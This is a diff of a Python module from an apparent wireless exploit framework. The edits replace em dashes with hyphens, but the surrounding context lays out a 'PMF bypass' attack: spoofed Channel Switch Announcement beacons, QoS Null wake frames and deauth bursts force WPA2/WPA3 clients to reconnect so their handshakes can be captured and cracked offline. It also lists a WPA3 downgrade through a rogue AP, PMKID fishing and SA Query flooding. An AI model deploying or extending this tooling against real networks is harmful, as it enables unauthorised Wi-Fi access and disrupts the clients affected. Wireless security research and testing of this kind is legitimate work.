@@ -1,19 +1,19 @@
 #!/usr/bin/env python3
 # Author: Andre Henrique (@mrhenrike) | Uniao Geek
-"""CSA Handshake Capture — PMF bypass via Channel Switch Announcement.
+"""CSA Handshake Capture - PMF bypass via Channel Switch Announcement.
 
 The definitive technique for capturing WPA2/WPA3 handshakes from modern APs
 with PMF Required (802.11w) and modern clients (iPhone, Android 10+).
 
 WHY CSA WORKS WHEN DEAUTH FAILS:
-  - 802.11w (PMF) cryptographically protects Deauthentication and Disassociation
-    frames — unprotected deauth is silently dropped by PMF-capable clients.
-  - Channel Switch Announcement (IE 37) is carried INSIDE the beacon frame body
+ - 802.11w (PMF) cryptographically protects Deauthentication and Disassociation
+    frames - unprotected deauth is silently dropped by PMF-capable clients.
+ - Channel Switch Announcement (IE 37) is carried INSIDE the beacon frame body
     and beacon frames are NEVER protected by PMF (they are broadcast management
     frames; encrypting them would break channel discovery for all devices).
-  - Therefore, a spoofed beacon carrying a CSA element is indistinguishable from
+ - Therefore, a spoofed beacon carrying a CSA element is indistinguishable from
     a legitimate one. The client obeys it, attempts the channel switch, fails (no
-    AP on the fake channel), and re-associates — triggering a fresh 4-way handshake.
+    AP on the fake channel), and re-associates - triggering a fresh 4-way handshake.
 
 ATTACK STRATEGY (from wifikit v0.6.0 research + Politician library):
   1. PMF detection: read MFPC/MFPR bits from RSN IE of target beacon
@@ -22,7 +22,7 @@ ATTACK STRATEGY (from wifikit v0.6.0 research + Politician library):
      clients so they are listening when the CSA beacon arrives
   4. CSA Burst 1: inject spoofed beacons with CSA element pointing to a
      non-existent or unused channel (channel_switch_count=2 first, then 1)
-     Intel firmware requires count≥2 first, then 1 — send both.
+     Intel firmware requires count≥2 first, then 1 - send both.
   5. Gap: 2s pause for STA queue processing (some chipsets need this)
   6. CSA Burst 2: second wave catches stragglers / clients that missed first
   7. Listen with M1-lock: monitor EAPOL; if M1 detected extend dwell 800ms
@@ -32,21 +32,21 @@ ATTACK STRATEGY (from wifikit v0.6.0 research + Politician library):
  10. Passive fallback: zero-TX mode just monitors for organic reconnections
 
 ADDITIONAL TECHNIQUES:
-  - WPA3 Transition Mode downgrade: if AP advertises SAE+WPA2, a WPA2-only
+ - WPA3 Transition Mode downgrade: if AP advertises SAE+WPA2, a WPA2-only
     rogue AP with the same SSID forces WPA2 4-way (crackable offline).
-  - PMKID fishing via RSN IE in fake AssocReq (included here as secondary).
-  - WNM Sleep Mode wakeup: IEEE 802.11v BSS Transition Request can displace
-    clients to a preferred BSS — forcing reconnect.
-  - SA Query timeout abuse: flood SA Query with fake PMF queries to exhaust
+ - PMKID fishing via RSN IE in fake AssocReq (included here as secondary).
+ - WNM Sleep Mode wakeup: IEEE 802.11v BSS Transition Request can displace
+    clients to a preferred BSS - forcing reconnect.
+ - SA Query timeout abuse: flood SA Query with fake PMF queries to exhaust
     the SA Query mechanism (edge case, target-specific).
 
 OS requirement: Linux only
 Version: 2.0.0
 References:
-  - https://github.com/RLabs-Inc/wifikit (CSA strategy)
-  - https://github.com/0ldev/Politician (ESP32 implementation)
-  - https://github.com/vanhoefm/libwifi-examples/blob/master/beacon_csa_attack.py
-  - IEEE 802.11-2020 §9.4.2.18 (Channel Switch Announcement)
+ - https://github.com/RLabs-Inc/wifikit (CSA strategy)
+ - https://github.com/0ldev/Politician (ESP32 implementation)
+ - https://github.com/vanhoefm/libwifi-examples/blob/master/beacon_csa_attack.py
+ - IEEE 802.11-2020 §9.4.2.18 (Channel Switch Announcement)
 """
 
 import logging
@@ -209,7 +209,7 @@ def _build_csa_beacon(
 
 
 def _build_qos_null(bssid: str, client_mac: str) -> object:
-    """QoS Null Data frame FromDS=1, MoreData=1 — wakes sleeping clients."""
+    """QoS Null Data frame FromDS=1, MoreData=1 - wakes sleeping clients."""
     from scapy.all import Dot11, Dot11QoS, RadioTap
     # type=2 (data), subtype=12 (QoS Null)
     # FromDS=1 (2 in DS field), MoreData=1
@@ -279,7 +279,7 @@ class CSAHandshakeCapturer:
         self._stop   = threading.Event()
         self._m1_lock = threading.Event()
         self._beacon_cache = None
-        self.lock    = threading.RLock()  # reentrant — _save_handshake called inside locked sections
+        self.lock    = threading.RLock()  # reentrant - _save_handshake called inside locked sections
 
     # ------------------------------------------------------------------
     # Passive sniffer
@@ -359,9 +359,9 @@ class CSAHandshakeCapturer:
                                     self._save_handshake(client, pair_pkts)
                                     return
                                 else:
-                                    print_info(f"  [EAPOL-M2] gap too large ({now-m1_ts:.1f}s) — skipping pair")
+                                    print_info(f"  [EAPOL-M2] gap too large ({now-m1_ts:.1f}s) - skipping pair")
                             else:
-                                # No M1 seen — save anyway for passive analysis
+                                # No M1 seen - save anyway for passive analysis
                                 self.eapol_store.setdefault(client, []).append(pkt)
 
                         elif is_m3 or is_m4:
@@ -463,7 +463,7 @@ class CSAHandshakeCapturer:
         while self._beacon_cache is None and time.time() - t0 < 10:
             time.sleep(0.5)
         if self._beacon_cache is None:
-            print_warning("  No beacon received — using synthetic CSA beacon")
+            print_warning("  No beacon received - using synthetic CSA beacon")
 
         # Pick fake channel (opposite band edge)
         fake_ch = 1 if self.channel >= 7 else 13
@@ -481,7 +481,7 @@ class CSAHandshakeCapturer:
                 self._stimulate_clients(clients)
                 time.sleep(0.2)
 
-            # Step 2: CSA burst (primary — works even with PMF Required)
+            # Step 2: CSA burst (primary - works even with PMF Required)
             self._send_csa_burst(fake_ch, clients)
             time.sleep(self.csa_gap_s)
 
@@ -493,7 +493,7 @@ class CSAHandshakeCapturer:
             if not self.mfpr:
                 self._send_deauth_burst(clients)
 
-            # Step 5: M1-lock — if M1 seen, wait extra 800ms for M2
+            # Step 5: M1-lock - if M1 seen, wait extra 800ms for M2
             self._m1_lock.clear()
             listen_end = time.time() + 5.0
             while time.time() < listen_end:
@@ -505,7 +505,7 @@ class CSAHandshakeCapturer:
                 if self.captured:
                     break
 
-            # Step 6: Half-handshake pivot — if only M2 seen, retry immediately
+            # Step 6: Half-handshake pivot - if only M2 seen, retry immediately
             with self.lock:
                 for client, pkts in self.eapol_store.items():
                     if client not in self.captured:
@@ -520,7 +520,7 @@ class CSAHandshakeCapturer:
                                 elif ack and mic and sec: m_types.append("M3")
                                 elif mic and not ack and sec: m_types.append("M4")
                         if "M2" in m_types and "M1" not in m_types:
-                            print_warning(f"  [PIVOT] M2-only for {client} — immediate CSA retry")
+                            print_warning(f"  [PIVOT] M2-only for {client} - immediate CSA retry")
 
             time.sleep(1.0)
 
@@ -535,14 +535,14 @@ class CSAHandshakeCapturer:
 
 @requires_os(OSRequirement.LINUX_ONLY)
 class Exploit(Exploit):
-    """CSA Handshake Capture — PMF bypass via Channel Switch Announcement.
+    """CSA Handshake Capture - PMF bypass via Channel Switch Announcement.
 
     The only reliable technique for capturing 4-way handshakes from:
-      - WPA2 networks with PMF Required (802.11w mandatory)
-      - WPA3 networks with SAE + PMF
-      - Modern clients: iPhone (iOS 16+), Android 10+, Windows 11
+ - WPA2 networks with PMF Required (802.11w mandatory)
+ - WPA3 networks with SAE + PMF
+ - Modern clients: iPhone (iOS 16+), Android 10+, Windows 11
 
-    CSA beacons are EXEMPT from 802.11w — the standard explicitly does not
+    CSA beacons are EXEMPT from 802.11w - the standard explicitly does not
     protect broadcast beacon frames, meaning our spoofed CSA beacon is
     indistinguishable from a legitimate one and obeyed by all clients.
 
@@ -553,7 +553,7 @@ class Exploit(Exploit):
         "name": "CSA Handshake Capture (PMF bypass)",
         "description": (
             "Modern handshake capture technique using Channel Switch Announcement "
-            "injection. CSA is exempt from 802.11w PMF — works against WPA2/WPA3 "
+            "injection. CSA is exempt from 802.11w PMF - works against WPA2/WPA3 "
             "with PMF Required and modern clients (iPhone, Android 10+). "
             "Includes QoS Null stimulation to wake sleeping clients, M1-lock dwell "
             "extension, half-handshake pivot, and deauth fallback for non-PMF APs."
